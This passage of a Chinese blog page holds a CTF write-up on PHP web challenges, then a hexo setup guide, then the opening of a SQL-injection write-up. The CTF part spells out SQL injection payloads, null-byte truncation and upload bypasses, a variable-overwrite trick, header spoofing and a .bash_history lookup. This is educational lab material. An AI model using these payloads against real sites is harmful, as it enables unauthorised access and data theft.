href="#题目考察php中ereg-函数的-00截断漏洞，被匹配的字符串如果包含-00会被截断，后面的字符串不再参与匹配。需要构造" class="headerlink" title="题目考察php中ereg()函数的\00截断漏洞，被匹配的字符串如果包含\00会被截断，后面的字符串不再参与匹配。需要构造"></a>题目考察php中<code>ereg()</code>函数的<code>\00</code>截断漏洞，被匹配的字符串如果包含<code>\00</code>会被截断，后面的字符串不再参与匹配。需要构造</h3><pre><code>?nctf=1%00%23biubiubiu
</code></pre>
<h3 id="注意这里的-被URL编码为-23是为了不被解析为URL中的锚。"><a href="#注意这里的-被URL编码为-23是为了不被解析为URL中的锚。" class="headerlink" title="注意这里的#被URL编码为%23是为了不被解析为URL中的锚。"></a>注意这里的<code>#</code>被URL编码为<code>%23</code>是为了不被解析为URL中的<code>锚</code>。</h3><h2 id="13-GBK-Injection"><a href="#13-GBK-Injection" class="headerlink" title="13.GBK Injection"></a>13.GBK Injection</h2><h3 id="利用常见的宽字节注入漏洞，注意本题过滤了where子句中的-39-，可用hex编码绕过。或者直接用sqlmap也可以跑出来。"><a href="#利用常见的宽字节注入漏洞，注意本题过滤了where子句中的-39-，可用hex编码绕过。或者直接用sqlmap也可以跑出来。" class="headerlink" title="利用常见的宽字节注入漏洞，注意本题过滤了where子句中的&#39;，可用hex编码绕过。或者直接用sqlmap也可以跑出来。"></a>利用常见的宽字节注入漏洞，注意本题过滤了where子句中的<code>&#39;</code>，可用hex编码绕过。或者直接用sqlmap也可以跑出来。</h3><h2 id="14-bypass-again"><a href="#14-bypass-again" class="headerlink" title="14.bypass again"></a>14.bypass again</h2><h3 id="此题目依旧考察php弱类型，两字符串使用-比较时均会先转型为数字，再比较。转型规则见3-md5-collision。直接使用上题的字符串即可。"><a href="#此题目依旧考察php弱类型，两字符串使用-比较时均会先转型为数字，再比较。转型规则见3-md5-collision。直接使用上题的字符串即可。" class="headerlink" title="此题目依旧考察php弱类型，两字符串使用==比较时均会先转型为数字，再比较。转型规则见3.md5 collision。直接使用上题的字符串即可。"></a>此题目依旧考察php弱类型，两字符串使用<code>==</code>比较时均会先转型为数字，再比较。转型规则见<a href="#collision">3.md5 collision</a>。直接使用上题的字符串即可。</h3><h2 id="15-变量覆盖"><a href="#15-变量覆盖" class="headerlink" title="15.变量覆盖"></a>15.变量覆盖</h2><h3 id="此题考察extract-函数的变量覆盖问题，extract-会将键名当作变量名，值作为变量的值-将变量从数组中导入到当前的符号表中。如果使用默认的EXTR-OVERWRITE模式，并将此函数用于接收用户的输入，则会导致严重的变量覆盖问题。此题中的"><a href="#此题考察extract-函数的变量覆盖问题，extract-会将键名当作变量名，值作为变量的值-将变量从数组中导入到当前的符号表中。如果使用默认的EXTR-OVERWRITE模式，并将此函数用于接收用户的输入，则会导致严重的变量覆盖问题。此题中的" class="headerlink" title="此题考察extract()函数的变量覆盖问题，extract()会将键名当作变量名，值作为变量的值,将变量从数组中导入到当前的符号表中。如果使用默认的EXTR_OVERWRITE模式，并将此函数用于接收用户的输入，则会导致严重的变量覆盖问题。此题中的"></a>此题考察<code>extract()</code>函数的变量覆盖问题，<code>extract()</code>会将键名当作变量名，值作为变量的值,将变量从数组中导入到当前的符号表中。如果使用默认的<code>EXTR_OVERWRITE</code>模式，并将此函数用于接收用户的输入，则会导致严重的变量覆盖问题。此题中的</h3><pre><code>if ($pass == $thepassword_123) &#123;
    echo $theflag;
&#125;
</code></pre>
<h3 id="就由于用户POST了pass-1-amp-thepassword-123-1而被绕过。"><a href="#就由于用户POST了pass-1-amp-thepassword-123-1而被绕过。" class="headerlink" title="就由于用户POST了pass=1&amp;thepassword_123=1而被绕过。"></a>就由于用户<code>POST</code>了<code>pass=1&amp;thepassword_123=1</code>而被绕过。</h3><h2 id="16-伪装者"><a href="#16-伪装者" class="headerlink" title="16.伪装者"></a>16.伪装者</h2><h3 id="此题提示只有本地可以访问，尝试在请求头部加client-ip-127-0-0-1和X-Forwarded-For-127-0-0-1，发现client-ip-127-0-0-1有效。"><a href="#此题提示只有本地可以访问，尝试在请求头部加client-ip-127-0-0-1和X-Forwarded-For-127-0-0-1，发现client-ip-127-0-0-1有效。" class="headerlink" title="此题提示只有本地可以访问，尝试在请求头部加client-ip: 127.0.0.1和X-Forwarded-For: 127.0.0.1，发现client-ip: 127.0.0.1有效。"></a>此题提示只有本地可以访问，尝试在请求头部加<code>client-ip: 127.0.0.1</code>和<code>X-Forwarded-For: 127.0.0.1</code>，发现<code>client-ip: 127.0.0.1</code>有效。</h3><h2 id="17-上传绕过"><a href="#17-上传绕过" class="headerlink" title="17.上传绕过"></a>17.上传绕过</h2><h3 id="此题尝试-00截断，在-uploads-后添加1-php-jpg-中间的空白需要用hex编辑为00-即能上传成功。不必修改filename-quot-1-jpg-quot-。"><a href="#此题尝试-00截断，在-uploads-后添加1-php-jpg-中间的空白需要用hex编辑为00-即能上传成功。不必修改filename-quot-1-jpg-quot-。" class="headerlink" title="此题尝试\00截断，在/uploads/后添加1.php jpg,中间的空白需要用hex编辑为00,即能上传成功。不必修改filename=&quot;1.jpg&quot;。"></a>此题尝试<code>\00</code>截断，在<code>/uploads/</code>后添加<code>1.php jpg</code>,中间的空白需要用hex编辑为<code>00</code>,即能上传成功。不必修改<code>filename=&quot;1.jpg&quot;</code>。</h3>
<h2 id="18-SQL注入1"><a href="#18-SQL注入1" class="headerlink" title="18.SQL注入1"></a>18.SQL注入1</h2><h3 id="看源码，即可解题。"><a href="#看源码，即可解题。" class="headerlink" title="看源码，即可解题。"></a>看源码，即可解题。</h3><pre><code>user=admin%27%29%23&amp;pass=Password
</code></pre>
<h2 id="19-pass-check"><a href="#19-pass-check" class="headerlink" title="19.pass check"></a>19.pass check</h2><h3 id="该题目考察srtcmp-，当函数发生错误时，会显示警告并返回0。提交数组进行比较引发strcmp-报错即可。"><a href="#该题目考察srtcmp-，当函数发生错误时，会显示警告并返回0。提交数组进行比较引发strcmp-报错即可。" class="headerlink" title="该题目考察srtcmp()，当函数发生错误时，会显示警告并返回0。提交数组进行比较引发strcmp()报错即可。"></a>该题目考察<code>srtcmp()</code>，当函数发生错误时，会显示警告并返回0。提交数组进行比较引发<code>strcmp()</code>报错即可。</h3><pre><code>pass[]=
</code></pre>
<h3 id="注意在提交请求时要使用POST请求提交。可以直接在burp中修改请求-也可以自己在html中添加form表单，并使用POST方法提交-还可以使用firefox的hackbar插件进行POST提交。"><a href="#注意在提交请求时要使用POST请求提交。可以直接在burp中修改请求-也可以自己在html中添加form表单，并使用POST方法提交-还可以使用firefox的hackbar插件进行POST提交。" class="headerlink" title="注意在提交请求时要使用POST请求提交。可以直接在burp中修改请求;也可以自己在html中添加form表单，并使用POST方法提交;还可以使用firefox的hackbar插件进行POST提交。"></a>注意在提交请求时要使用POST请求提交。可以直接在burp中修改请求;也可以自己在html中添加form表单，并使用POST方法提交;还可以使用<code>firefox</code>的<code>hackbar</code>插件进行POST提交。</h3>
<h2 id="20-起名字真难"><a href="#20-起名字真难" class="headerlink" title="20.起名字真难"></a>20.起名字真难</h2><h3 id="仔细阅读题目给出的源码，大意是将-GET得到的字符串按位转化为对应的ASCII码，并判断该ASCII码是否介于1～9的ASCII码之间，如果在则返回false，否则判断该字符串的值是否与54975581388相等，相等则返回true。可以想到利用16进制字符串绕过。而且54975581388的16进制恰好是0xccccccccc，该字符串的每一位都符合函数判断条件。"><a href="#仔细阅读题目给出的源码，大意是将-GET得到的字符串按位转化为对应的ASCII码，并判断该ASCII码是否介于1～9的ASCII码之间，如果在则返回false，否则判断该字符串的值是否与54975581388相等，相等则返回true。可以想到利用16进制字符串绕过。而且54975581388的16进制恰好是0xccccccccc，该字符串的每一位都符合函数判断条件。" class="headerlink" title="仔细阅读题目给出的源码，大意是将$_GET得到的字符串按位转化为对应的ASCII码，并判断该ASCII码是否介于1～9的ASCII码之间，如果在则返回false，否则判断该字符串的值是否与54975581388相等，相等则返回true。可以想到利用16进制字符串绕过。而且54975581388的16进制恰好是0xccccccccc，该字符串的每一位都符合函数判断条件。"></a>仔细阅读题目给出的源码，大意是将<code>$_GET</code>得到的字符串按位转化为对应的ASCII码，并判断该ASCII码是否介于<code>1～9</code>的ASCII码之间，如果在则返回<code>false</code>，否则判断该字符串的值是否与<code>54975581388</code>相等，相等则返回<code>true</code>。可以想到利用16进制字符串绕过。而且<code>54975581388</code>的16进制恰好是<code>0xccccccccc</code>，该字符串的每一位都符合函数判断条件。</h3><h2 id="21-密码重置"><a href="#21-密码重置" class="headerlink" title="21.密码重置"></a>21.密码重置</h2><h3 id="观察题目的URL-web13-index-php-user1-Y3RmdXNlcg-，发现Y3RmdXNlcg-为ctfuser的base64编码，故将user1的参数换为admin的base64编码，并将post的用户名修改为admin提交如下："><a href="#观察题目的URL-web13-index-php-user1-Y3RmdXNlcg-，发现Y3RmdXNlcg-为ctfuser的base64编码，故将user1的参数换为admin的base64编码，并将post的用户名修改为admin提交如下：" class="headerlink" title="观察题目的URL/web13/index.php?user1=Y3RmdXNlcg==，发现Y3RmdXNlcg==为ctfuser的base64编码，故将user1的参数换为admin的base64编码，并将post的用户名修改为admin提交如下："></a>观察题目的URL<code>/web13/index.php?user1=Y3RmdXNlcg==</code>，发现<code>Y3RmdXNlcg==</code>为<code>ctfuser</code>的base64编码，故将<code>user1</code>的参数换为<code>admin</code>的base64编码，并将post的用户名修改为<code>admin</code>提交如下：</h3>
<h2 id="22-SQL-Injection"><a href="#22-SQL-Injection" class="headerlink" title="22.SQL Injection"></a>22.SQL Injection</h2><h3 id="通过查看页面源代码得到该题的源码，发现代码使用了stripslashes-删除用户提交的-构成的转义符号。同时使用htmlentities-str-ENT-QUOTES-将用户提交的-39-和-quot-转义为html实体。故尝试提交："><a href="#通过查看页面源代码得到该题的源码，发现代码使用了stripslashes-删除用户提交的-构成的转义符号。同时使用htmlentities-str-ENT-QUOTES-将用户提交的-39-和-quot-转义为html实体。故尝试提交：" class="headerlink" title="通过查看页面源代码得到该题的源码，发现代码使用了stripslashes()删除用户提交的\构成的转义符号。同时使用htmlentities($str, ENT_QUOTES)将用户提交的&#39;和&quot;转义为html实体。故尝试提交："></a>通过查看页面源代码得到该题的源码，发现代码使用了<code>stripslashes()</code>删除用户提交的<code>\</code>构成的转义符号。同时使用<code>htmlentities($str, ENT_QUOTES)</code>将用户提交的<code>&#39;</code>和<code>&quot;</code>转义为html实体。故尝试提交：</h3><pre><code>username=\\&amp;password=||1%23
</code></pre>
<h3 id="拼接后的查询语句为："><a href="#拼接后的查询语句为：" class="headerlink" title="拼接后的查询语句为："></a>拼接后的查询语句为：</h3><pre><code>SELECT * FROM users WHERE name=&#39;\&#39; AND pass=&#39;||1#&#39;;
</code></pre>
<h3 id="但是这样并不能成功注入，猜测是由于get-magic-quotes-gpc-返回为0-所以stripslashes-未执行，故修改为："><a href="#但是这样并不能成功注入，猜测是由于get-magic-quotes-gpc-返回为0-所以stripslashes-未执行，故修改为：" class="headerlink" title="但是这样并不能成功注入，猜测是由于get_magic_quotes_gpc()返回为0,所以stripslashes()未执行，故修改为："></a>但是这样并不能成功注入，猜测是由于<code>get_magic_quotes_gpc()</code>返回为0,所以<code>stripslashes()</code>未执行，故修改为：</h3><pre><code>username=\&amp;password=||1%23
</code></pre>
<h3 id="成功提交。"><a href="#成功提交。" class="headerlink" title="成功提交。"></a>成功提交。</h3><h3 id="注：查看网页源代码是个好习惯，本题中的html实体编码在普通网页中看不出来。"><a href="#注：查看网页源代码是个好习惯，本题中的html实体编码在普通网页中看不出来。" class="headerlink" title="注：查看网页源代码是个好习惯，本题中的html实体编码在普通网页中看不出来。"></a><em><strong>注：查看网页源代码是个好习惯，本题中的html实体编码在普通网页中看不出来。</strong></em></h3><h2 id="23-SQL注入2"><a href="#23-SQL注入2" class="headerlink" title="23.SQL注入2"></a>23.SQL注入2</h2><h3 id="查看php源码，发现可以使用union注入。"><a href="#查看php源码，发现可以使用union注入。" class="headerlink" title="查看php源码，发现可以使用union注入。"></a>查看php源码，发现可以使用union注入。</h3><pre><code>if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;
    echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;
&#125;
</code></pre>
<h3 id="题目通过比较查询出的密码和用户输入的密码比对来验证，故可以通过union-select人为添加查询结果，并提交密码。这样两个参数均可以被控制。故提交如下："><a href="#题目通过比较查询出的密码和用户输入的密码比对来验证，故可以通过union-select人为添加查询结果，并提交密码。这样两个参数均可以被控制。故提交如下：" class="headerlink" title="题目通过比较查询出的密码和用户输入的密码比对来验证，故可以通过union select人为添加查询结果，并提交密码。这样两个参数均可以被控制。故提交如下："></a>题目通过比较查询出的密码和用户输入的密码比对来验证，故可以通过<code>union select</code>人为添加查询结果，并提交密码。这样两个参数均可以被控制。故提交如下：</h3><pre><code>user=%27union+select+md5%28%27pass%27%29 %23&amp;pass=pass
</code></pre>

<h2 id="24-综合题"><a href="#24-综合题" class="headerlink" title="24.综合题"></a>24.综合题</h2><h3 id="访问题目链接，发现是JSFuck编码，将该编码放到浏览器的console中执行，页面显示"><a href="#访问题目链接，发现是JSFuck编码，将该编码放到浏览器的console中执行，页面显示" class="headerlink" title="访问题目链接，发现是JSFuck编码，将该编码放到浏览器的console中执行，页面显示"></a>访问题目链接，发现是JSFuck编码，将该编码放到浏览器的console中执行，页面显示</h3>
<h3 id="访问该文件"><a href="#访问该文件" class="headerlink" title="访问该文件"></a>访问该文件</h3><pre><code>/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php
</code></pre>
<h3 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h3>
<h3 id="查看响应的头部发现"><a href="#查看响应的头部发现" class="headerlink" title="查看响应的头部发现"></a>查看响应的头部发现</h3>
<h3 id="由于linux下会将历史命令保存在用户-home目录下的-bash-history中，故尝试访问该文件。"><a href="#由于linux下会将历史命令保存在用户-home目录下的-bash-history中，故尝试访问该文件。" class="headerlink" title="由于linux下会将历史命令保存在用户/home目录下的.bash_history中，故尝试访问该文件。"></a>由于linux下会将历史命令保存在用户<code>/home</code>目录下的<code>.bash_history</code>中，故尝试访问该文件。</h3><pre><code>/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history
</code></pre>
<h3 id="找到以下历史命令："><a href="#找到以下历史命令：" class="headerlink" title="找到以下历史命令："></a>找到以下历史命令：</h3><pre><code>zip -r flagbak.zip ./*
</code></pre>
<h3 id="猜测该目录下存在flagbak-zip-故访问："><a href="#猜测该目录下存在flagbak-zip-故访问：" class="headerlink" title="猜测该目录下存在flagbak.zip,故访问："></a>猜测该目录下存在<code>flagbak.zip</code>,故访问：</h3><pre><code>/web3/b0b0ad119f425408fc3d45253137d33d/lagbak.zip
</code></pre>
<h3 id="下载解压出flag-txt-拿到flag。"><a href="#下载解压出flag-txt-拿到flag。" class="headerlink" title="下载解压出flag.txt,拿到flag。"></a>下载解压出<code>flag.txt</code>,拿到flag。</h3><h2 id="25-密码重置2"><a href="#25-密码重置2" class="headerlink" title="25.密码重置2"></a>25.密码重置2</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3>-->
      
    </div>
    <footer class="article-footer">
      <!--<a data-url="https://rock718.github.io.git/2019/12/21/CG-CTF-wp/" data-id="cl9y4cx9g000q24fy20npc9gb" class="article-share-link">Share</a>-->
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-再“见”hexo——重新理解hexo" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/28/%E5%86%8D%E2%80%9C%E8%A7%81%E2%80%9Dhexo%E2%80%94%E2%80%94%E9%87%8D%E6%96%B0%E7%90%86%E8%A7%A3hexo/">再“见”hexo——重新理解hexo</a>
    </h1>
  

        <a href="/2019/11/28/%E5%86%8D%E2%80%9C%E8%A7%81%E2%80%9Dhexo%E2%80%94%E2%80%94%E9%87%8D%E6%96%B0%E7%90%86%E8%A7%A3hexo/" class="article-date">
  <time datetime="2019-11-28T12:23:47.000Z" itemprop="datePublished">2019-11-28</time>
</a>
      </header>
    
    <div class="article-entry-abstract" itemprop="articleBody">
      
        <!--<h1 id="再“见”hexo——重新理解hexo"><a href="#再“见”hexo——重新理解hexo" class="headerlink" title="再“见”hexo——重新理解hexo"></a>再“见”hexo——重新理解hexo</h1><h3 id="从两年前初次接触hexo，到工作之后再次拾起hexo并解决了一些坑。我想重新再梳理一下hexo的用法和安装中的坑。"><a href="#从两年前初次接触hexo，到工作之后再次拾起hexo并解决了一些坑。我想重新再梳理一下hexo的用法和安装中的坑。" class="headerlink" title="从两年前初次接触hexo，到工作之后再次拾起hexo并解决了一些坑。我想重新再梳理一下hexo的用法和安装中的坑。"></a><em>从两年前初次接触hexo，到工作之后再次拾起hexo并解决了一些坑。我想重新再梳理一下hexo的用法和安装中的坑。</em></h3><h2 id="1-Node-js-npm-hexo他们是什么关系？"><a href="#1-Node-js-npm-hexo他们是什么关系？" class="headerlink" title="1.Node.js npm hexo他们是什么关系？"></a>1.Node.js npm hexo他们是什么关系？</h2><h3 id="1-Nodejs"><a href="#1-Nodejs" class="headerlink" title="(1)Nodejs"></a>(1)Nodejs</h3><h4 id="官方解释：Node-js-是一个基于-Chrome-V8-引擎的-JavaScript-运行时。"><a href="#官方解释：Node-js-是一个基于-Chrome-V8-引擎的-JavaScript-运行时。" class="headerlink" title="官方解释：Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行时。"></a>官方解释：Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行时。</h4><h4 id="简单的说-Node-js-就是运行在服务端的-JavaScript。"><a href="#简单的说-Node-js-就是运行在服务端的-JavaScript。" class="headerlink" title="简单的说 Node.js 就是运行在服务端的 JavaScript。"></a>简单的说 Node.js 就是运行在服务端的 JavaScript。</h4><h4 id="我目前的理解是，对于hexo来说，Node-js是将hexo的markdown文本编写成html等文件的编译器。"><a href="#我目前的理解是，对于hexo来说，Node-js是将hexo的markdown文本编写成html等文件的编译器。" class="headerlink" title="我目前的理解是，对于hexo来说，Node.js是将hexo的markdown文本编写成html等文件的编译器。"></a>我目前的理解是，对于hexo来说，Node.js是将hexo的markdown文本编写成html等文件的编译器。</h4><h3 id="2-npm"><a href="#2-npm" class="headerlink" title="(2)npm"></a>(2)npm</h3><h4 id="npm-是-JavaScript-世界的包管理工具。"><a href="#npm-是-JavaScript-世界的包管理工具。" class="headerlink" title="npm 是 JavaScript 世界的包管理工具。"></a>npm 是 JavaScript 世界的包管理工具。</h4><h4 id="我的理解，npm是用于安装各种第三方JavaScript模块的软件管理器。类似于Ubuntu-x2F-Debian系统中的apt包管理器或者是CentOS系统中的yum。"><a href="#我的理解，npm是用于安装各种第三方JavaScript模块的软件管理器。类似于Ubuntu-x2F-Debian系统中的apt包管理器或者是CentOS系统中的yum。" class="headerlink" title="我的理解，npm是用于安装各种第三方JavaScript模块的软件管理器。类似于Ubuntu&#x2F;Debian系统中的apt包管理器或者是CentOS系统中的yum。"></a>我的理解，npm是用于安装各种第三方JavaScript模块的软件管理器。类似于Ubuntu&#x2F;Debian系统中的apt包管理器或者是CentOS系统中的yum。</h4><h3 id="3-hexo"><a href="#3-hexo" class="headerlink" title="(3)hexo"></a>(3)hexo</h3><h4 id="官方解释：Hexo-是一个快速、简洁且高效的博客框架。Hexo-使用-Markdown-或其他渲染引擎-解析文章，在几秒内，即可利用靓丽的主题生成静态网页。"><a href="#官方解释：Hexo-是一个快速、简洁且高效的博客框架。Hexo-使用-Markdown-或其他渲染引擎-解析文章，在几秒内，即可利用靓丽的主题生成静态网页。" class="headerlink" title="官方解释：Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown(或其他渲染引擎)解析文章，在几秒内，即可利用靓丽的主题生成静态网页。"></a>官方解释：Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown(或其他渲染引擎)解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</h4><h4 id="我的简单理解：hexo可以让你用Markdown编写静态博客。"><a href="#我的简单理解：hexo可以让你用Markdown编写静态博客。" class="headerlink" title="我的简单理解：hexo可以让你用Markdown编写静态博客。"></a>我的简单理解：hexo可以让你用Markdown编写静态博客。</h4><h2 id="2-如何安装hexo"><a href="#2-如何安装hexo" class="headerlink" title="2.如何安装hexo"></a>2.如何安装hexo</h2><h3 id="1-构建本地博客源码仓库"><a href="#1-构建本地博客源码仓库" class="headerlink" title="(1)构建本地博客源码仓库"></a>(1)构建本地博客源码仓库</h3><h4 id="最佳方案，你需要参考hexo官网的安装教程。我的经验是不同的操作系统安装方法不一样，请务必尽量遵循官网的安装建议，否则不一定哪里会出现问题。"><a href="#最佳方案，你需要参考hexo官网的安装教程。我的经验是不同的操作系统安装方法不一样，请务必尽量遵循官网的安装建议，否则不一定哪里会出现问题。" class="headerlink" title="最佳方案，你需要参考hexo官网的安装教程。我的经验是不同的操作系统安装方法不一样，请务必尽量遵循官网的安装建议，否则不一定哪里会出现问题。"></a>最佳方案，你需要参考<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">hexo官网的安装教程</a>。我的经验是不同的操作系统安装方法不一样，请务必尽量遵循官网的安装建议，否则不一定哪里会出现问题。</h4><h3 id="2-生成远程博客托管仓库"><a href="#2-生成远程博客托管仓库" class="headerlink" title="(2)生成远程博客托管仓库"></a>(2)生成远程博客托管仓库</h3><h4 id="你可以选择托管到github或coding上或者是你自己的主机上，这一点网上的许多教程都有说过，这里不再赘述。"><a href="#你可以选择托管到github或coding上或者是你自己的主机上，这一点网上的许多教程都有说过，这里不再赘述。" class="headerlink" title="你可以选择托管到github或coding上或者是你自己的主机上，这一点网上的许多教程都有说过，这里不再赘述。"></a>你可以选择托管到github或coding上或者是你自己的主机上，这一点网上的许多教程都有说过，这里不再赘述。</h4><h2 id="3-一些坑"><a href="#3-一些坑" class="headerlink" title="3.一些坑"></a>3.一些坑</h2><h3 id="1-如果你发现hexo生成文件后无法开启本地模拟服务器，即hexo-s无法识别且hexo的帮助中没有server指令。那么你可能没有安装hexo-server。Hexo-3-0-把服务器独立成了个别模块，你必须先安装hexo-server才能使用。"><a href="#1-如果你发现hexo生成文件后无法开启本地模拟服务器，即hexo-s无法识别且hexo的帮助中没有server指令。那么你可能没有安装hexo-server。Hexo-3-0-把服务器独立成了个别模块，你必须先安装hexo-server才能使用。" class="headerlink" title="(1)如果你发现hexo生成文件后无法开启本地模拟服务器，即hexo s无法识别且hexo的帮助中没有server指令。那么你可能没有安装hexo-server。Hexo 3.0 把服务器独立成了个别模块，你必须先安装hexo-server才能使用。"></a>(1)如果你发现hexo生成文件后无法开启本地模拟服务器，即<code>hexo s</code>无法识别且hexo的帮助中没有server指令。那么你可能没有安装<code>hexo-server</code>。Hexo 3.0 把服务器独立成了个别模块，你必须先安装<code>hexo-server</code>才能使用。</h3><pre><code>$ npm install hexo-server --save
</code></pre>
<h3 id="安装完成后，输入以下命令以启动服务器，你的网站会在http-localhost-4000下启动。"><a href="#安装完成后，输入以下命令以启动服务器，你的网站会在http-localhost-4000下启动。" class="headerlink" title="安装完成后，输入以下命令以启动服务器，你的网站会在http://localhost:4000下启动。"></a>安装完成后，输入以下命令以启动服务器，你的网站会在<code>http://localhost:4000</code>下启动。</h3><pre><code>$ hexo server
</code></pre>
<h3 id="如果你想要更改端口，或是在执行时遇到了EADDRINUSE错误，可以在执行时使用-p选项指定其他端口，如下："><a href="#如果你想要更改端口，或是在执行时遇到了EADDRINUSE错误，可以在执行时使用-p选项指定其他端口，如下：" class="headerlink" title="如果你想要更改端口，或是在执行时遇到了EADDRINUSE错误，可以在执行时使用-p选项指定其他端口，如下："></a>如果你想要更改端口，或是在执行时遇到了<code>EADDRINUSE</code>错误，可以在执行时使用<code>-p</code>选项指定其他端口，如下：</h3><pre><code>$ hexo server -p 5000
</code></pre>
<h3 id="2-在输入hexo-deploy后，hexo报如下错误："><a href="#2-在输入hexo-deploy后，hexo报如下错误：" class="headerlink" title="(2)在输入hexo deploy后，hexo报如下错误："></a>(2)在输入<code>hexo deploy</code>后，hexo报如下错误：</h3><pre><code>ERROR Deployer not found: git
</code></pre>
<h3 id="这是由于你没有安装hexo-deployer，执行以下命令来进行安装："><a href="#这是由于你没有安装hexo-deployer，执行以下命令来进行安装：" class="headerlink" title="这是由于你没有安装hexo-deployer，执行以下命令来进行安装："></a>这是由于你没有安装<code>hexo-deployer</code>，执行以下命令来进行安装：</h3><pre><code>$ npm install hexo-deployer-git --save
</code></pre>
<h3 id="3-在在输入hexo-deploy后，hexo提示："><a href="#3-在在输入hexo-deploy后，hexo提示：" class="headerlink" title="(3)在在输入hexo deploy后，hexo提示："></a>(3)在在输入<code>hexo deploy</code>后，hexo提示：</h3><pre><code>You should configure deployment settings in _config.yml first!
</code></pre>
<h3 id="查看一下你的hexo根目录下的-config-yml中deploy：的配置是否正确。应类似于以下内容："><a href="#查看一下你的hexo根目录下的-config-yml中deploy：的配置是否正确。应类似于以下内容：" class="headerlink" title="查看一下你的hexo根目录下的_config.yml中deploy：的配置是否正确。应类似于以下内容："></a>查看一下你的hexo根目录下的<code>_config.yml</code>中<code>deploy：</code>的配置是否正确。应类似于以下内容：</h3><pre><code>deploy:
type: git
repo: git@github.com:Rock718/rock718.github.io.git
</code></pre>
<h3 id="注意：这里的type-和repo-后面至少应该有一个空格。如果你有多个repo-，样子应该类似这样："><a href="#注意：这里的type-和repo-后面至少应该有一个空格。如果你有多个repo-，样子应该类似这样：" class="headerlink" title="注意：这里的type:和repo:后面至少应该有一个空格。如果你有多个repo:，样子应该类似这样："></a>注意：这里的<code>type:</code>和<code>repo:</code>后面至少应该有一个空格。如果你有多个<code>repo:</code>，样子应该类似这样：</h3><pre><code>deploy:
type: git
repo:
      github: git@github.com:Rock718/rock718.github.io.git
      coding: git@coding.com:**********
</code></pre>
<h3 id="一定要注意缩进的问题"><a href="#一定要注意缩进的问题" class="headerlink" title="一定要注意缩进的问题"></a>一定要注意缩进的问题</h3><h3 id="4-如果你想在hexo中插入图片，建议参考官网的推荐，使用形如："><a href="#4-如果你想在hexo中插入图片，建议参考官网的推荐，使用形如：" class="headerlink" title="(4)如果你想在hexo中插入图片，建议参考官网的推荐，使用形如："></a>(4)如果你想在hexo中插入图片，建议参考<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/asset-folders">官网的推荐</a>，使用形如：</h3><pre><code>&#123;% asset_img example.jpg This is an example image %&#125;
</code></pre>
<h3 id="当然，在这之前你需要配置hexo根目录下的-config-yml中post-asset-folder-为true"><a href="#当然，在这之前你需要配置hexo根目录下的-config-yml中post-asset-folder-为true" class="headerlink" title="当然，在这之前你需要配置hexo根目录下的_config.yml中post_asset_folder: 为true"></a>当然，在这之前你需要配置hexo根目录下的<code>_config.yml</code>中<code>post_asset_folder: </code>为<code>true</code></h3>-->
      
    </div>
    <footer class="article-footer">
      <!--<a data-url="https://rock718.github.io.git/2019/11/28/%E5%86%8D%E2%80%9C%E8%A7%81%E2%80%9Dhexo%E2%80%94%E2%80%94%E9%87%8D%E6%96%B0%E7%90%86%E8%A7%A3hexo/" data-id="cl9y4cx9r005k24fy2id36hw5" class="article-share-link">Share</a>-->
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-writeup-“百度杯”CTF比赛-九月场-SQLi" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/25/writeup-%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA-SQLi/">writeup-“百度杯”CTF比赛-九月场-SQLi</a>
    </h1>
  

        <a href="/2019/11/25/writeup-%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA-SQLi/" class="article-date">
  <time datetime="2019-11-25T15:03:26.000Z" itemprop="datePublished">2019-11-25</time>
</a>
      </header>
    
    <div class="article-entry-abstract" itemprop="articleBody">
      
        <!--<h1 id="“百度杯”CTF比赛-九月场-SQLi-解题过程"><a href="#“百度杯”CTF比赛-九月场-SQLi-解题过程" class="headerlink" title="“百度杯”CTF比赛-九月场-SQLi 解题过程"></a>“百度杯”CTF比赛-九月场-SQLi 解题过程</h1><h2 id="1-确定注入点"><a href="#1-确定注入点" class="headerlink" title="1.确定注入点"></a>1.确定注入点</h2><h3 id="打开题目，发现为空白页面，进而查看页面源代码"><a href="#打开题目，发现为空白页面，进而查看页面源代码" class="headerlink" title="打开题目，发现为空白页面，进而查看页面源代码"></a>打开题目，发现为空白页面，进而查看页面源代码</h3>
